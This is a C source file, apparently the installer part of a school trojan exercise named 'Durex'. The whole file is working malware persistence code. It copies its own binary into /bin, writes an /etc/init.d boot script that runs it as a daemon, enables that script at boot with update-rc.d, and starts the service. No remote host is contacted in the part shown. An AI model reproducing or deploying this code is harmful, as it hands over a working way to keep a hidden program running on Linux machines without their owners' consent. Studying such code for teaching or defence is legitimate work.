/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex_bin.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: user42 <user42@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/02/08 15:10:04 by user42            #+#    #+#             */
/*   Updated: 2022/02/14 16:37:17 by user42           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

void	self_replicate_to_target(void)
{
	int				path_len, bin_fd, out_fd;
	char			bin_path[256];
	struct stat		bin_st;
	void			*bin_map;

	path_len = readlink("/proc/self/exe", bin_path, 256);
	bin_path[path_len] = '\0';
	
	if ((bin_fd = open(bin_path, O_RDONLY)) < 0)
	{
		printf("[X] Durex binary can't open itself for self-replication.\n");
		exit(1);
	}
	if (fstat(bin_fd, &bin_st) != 0)
	{
		printf("[X] Durex binary can't fstat itself.\n");
		exit(1);
	}
	
	bin_map = mmap(0, bin_st.st_size, PROT_READ, MAP_PRIVATE, bin_fd, 0);
	if ((out_fd = open("/bin/durex", O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU)) < 0)
	{
		if (errno != ETXTBSY)
		{
			printf("[X] Durex binary can't open destination file for self-replicating.\n");
			exit(1);
		}
	}
	write(out_fd, bin_map, bin_st.st_size);

	close(bin_fd);
	close(out_fd);
	munmap(bin_map, bin_st.st_size);
}

void	write_initd_script(void)
{
	int		script_fd;
	char	payload[] = "#! /bin/bash\n\n### BEGIN INIT INFO\n# Provides:		durex\n# Required-start:		$local_fs\n# Required-stop:		$local_fs\n# Default-Start:		2 3 4 5\n# Default-Stop:		0 1 6\n# Short-Description:		durex\n# Description:		durex\n### END INIT INFO\n\n/bin/sh -c \"/bin/./durex daemon\"";

	if ((script_fd = open("/etc/init.d/durex", O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU)) == -1)
	{
		printf("[X] Error while opening script configuration file /etc/init.d/durex.\n");
		exit(1);
	}
	size_t nbytes = write(script_fd, payload, strlen(payload));
	if (nbytes != strlen(payload))
	{
		printf("[X] Error while writing to script configuration file.\n");
		exit(1);
	}
	close(script_fd);
}

void	enable_at_boot(void)
{
	char	**const args = malloc(4 * sizeof(char *));
	args[0] = "update-rc.d";
	args[1] = "durex";
	args[2] = "defaults";
	args[3] = NULL;
	if (exec_safe("update-rc.d", args) != 0)
	{
		printf("[X] Update-rc.d call failed.\n");
		exit(1);
	}
	free(args);
}

void	launch_durex_daemon(void)
{
	char	**const args = malloc(4 * sizeof(char *));
	args[0] = "service";
	args[1] = "durex";
	args[2] = "start";
	args[3] = NULL;
	if (exec_safe("service", args) != 0)
	{
		printf("[X] Failed to launch the daemon.\n");
		exit(1);
	}
	free(args);
}

void	durex_bin(void)
{
	self_replicate_to_target();
	write_initd_script();
	enable_at_boot();
	launch_durex_daemon();
	printf("qroland\n");
}
